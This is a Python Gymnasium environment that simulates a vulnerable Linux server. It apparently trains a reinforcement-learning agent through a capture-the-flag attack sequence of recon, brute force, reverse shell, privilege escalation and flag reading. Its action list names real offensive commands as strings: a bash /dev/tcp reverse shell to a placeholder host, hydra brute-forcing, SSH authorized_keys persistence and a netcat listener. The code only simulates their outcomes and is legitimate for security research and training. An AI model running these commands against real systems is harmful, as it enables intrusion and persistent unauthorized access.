
import gymnasium as gym
from gymnasium import spaces
import numpy as np
import random
from typing import Tuple, Dict, List

class LinuxSecEnv(gym.Env):
    """
    The Red Team Linux Gym.
    Simulates a vulnerable Linux Server for the agent to hack.
    
    State:
    - Current User (None, User, Root)
    - Current Directory
    - Knowledge (Ports Found, Vulns Found, Credentials Found)
    - Shell Status (No Shell, Reverse Shell, Stability)
    """
    
    def __init__(self):
        super(LinuxSecEnv, self).__init__()
        
        # ACTIONS (The Red Team Arsenal)
        # 0-4: Recon / Enumeration
        # 5-9: Initial Access / Exploitation
        # 10-14: Privilege Escalation
        # 15-19: Persistence / Looting
        self.actions = [
            "nmap -sV target",          # 0: Port Scan
            "enum4linux target",        # 1: SMB Enum
            "gobuster dir -u target",   # 2: Dir Busting
            "cat /etc/passwd",          # 3: Read Users
            "ps aux",                   # 4: Process List
            
            "hydra -l admin -P rockyou",# 5: Brute Force SSH
            "exploit_buffer_overflow",  # 6: Binary Exploit
            "exploit_cve_2025_1234",    # 7: Kernel Exploit
            "bash -i >& /dev/tcp/IP/PORT 0>&1", # 8: Reverse Shell (Bash)
            "python -c 'import socket...'",     # 9: Reverse Shell (Python)
            
            "sudo -l",                  # 10: Check Sudo Rights
            "find / -perm -4000",       # 11: Find SUID Binaries
            "cat /root/flag.txt",       # 12: Read Root Flag
            "linpeas.sh",               # 13: Auto Enum Script
            "dirty_cow_exploit",        # 14: PrivEsc Exploit
            
            "echo 'ssh-rsa ...' >> .ssh/authorized_keys", # 15: SSH Persistence
            "nc -lvnp 4444",            # 16: Listen for Callback
            "whoami",                   # 17: Check Identity
            "history",                  # 18: Check History
            "wait",                     # 19: Wait/Sleep
        ]
        
        self.action_space = spaces.Discrete(len(self.actions))
        
        # OBSERVATION (The Terminal Output & State)
        # 1. Access Level (0=None, 1=User, 2=Root)
        # 2. Ports Open (0=No, 1=Yes)
        # 3. Vuln Found (0=No, 1=Yes)
        # 4. Shell Active (0=No, 1=Yes)
        # 5. Alert Level (0=Silent, 1=Detected)
        self.observation_space = spaces.Box(low=0, high=2, shape=(5,), dtype=np.float32)
        
        # Game State
        self.access_level = 0
        self.ports_found = 0
        self.vuln_found = 0
        self.shell_active = 0
        self.alert_level = 0
        self.steps = 0
        self.max_steps = 50

    def reset(self, seed=None):
        super().reset(seed=seed)
        self.access_level = 0
        self.ports_found = 0
        self.vuln_found = 0
        self.shell_active = 0
        self.alert_level = 0
        self.steps = 0
        return self._get_obs(), {}

    def step(self, action_id):
        self.steps += 1
        reward = -1.0 # Time penalty
        done = False
        truncated = False
        info = {"action": self.actions[action_id], "output": "No output."}
        
        # --- LOGIC ENGINE ---
        
        # RECON PHASE
        if action_id == 0: # nmap
            if self.ports_found == 0:
                self.ports_found = 1
                reward += 10.0
                info["output"] = "PORT 22/tcp OPEN (SSH)\nPORT 80/tcp OPEN (HTTP)"
            else:
                info["output"] = "Ports already scanned."
                
        # EXPLOIT PHASE
        elif action_id == 5: # Hydra
            if self.ports_found == 1 and self.access_level == 0:
                if random.random() > 0.6: # 40% success rate
                    self.access_level = 1
                    reward += 50.0
                    info["output"] = "[SUCCESS] Password found: 'password123'"
                else:
                    self.alert_level = 1
                    info["output"] = "[FAIL] Brute force detected!"
            else:
                info["output"] = "Cannot brute force yet."

        elif action_id == 8: # Reverse Shell
            if self.access_level >= 1 and self.shell_active == 0:
                self.shell_active = 1
                reward += 30.0
                info["output"] = "Connection received from 10.10.10.5!"
            else:
                info["output"] = "Failed to trigger shell."

        # PRIVESC PHASE
        elif action_id == 10: # sudo -l
            if self.access_level == 1:
                self.vuln_found = 1
                reward += 20.0
                info["output"] = "User may run /usr/bin/vim as root NOPASSWD"
            else:
                info["output"] = "Permission denied."

        elif action_id == 14: # Dirty Cow / PrivEsc
            if self.vuln_found == 1 and self.access_level == 1:
                self.access_level = 2 # ROOT!
                reward += 100.0
                info["output"] = "# whoami\nroot"
            else:
                info["output"] = "Exploit failed."

        # LOOT PHASE
        elif action_id == 12: # Read Flag
            if self.access_level == 2:
                reward += 500.0 # WIN CONDITION
                done = True
                info["output"] = "CTF{L1nux_R00t_M4st3r}"
            else:
                info["output"] = "cat: /root/flag.txt: Permission denied"

        # Check Max Steps
        if self.steps >= self.max_steps:
            truncated = True
            
        return self._get_obs(), reward, done, truncated, info

    def _get_obs(self):
        return np.array([
            self.access_level,
            self.ports_found,
            self.vuln_found,
            self.shell_active,
            self.alert_level
        ], dtype=np.float32)
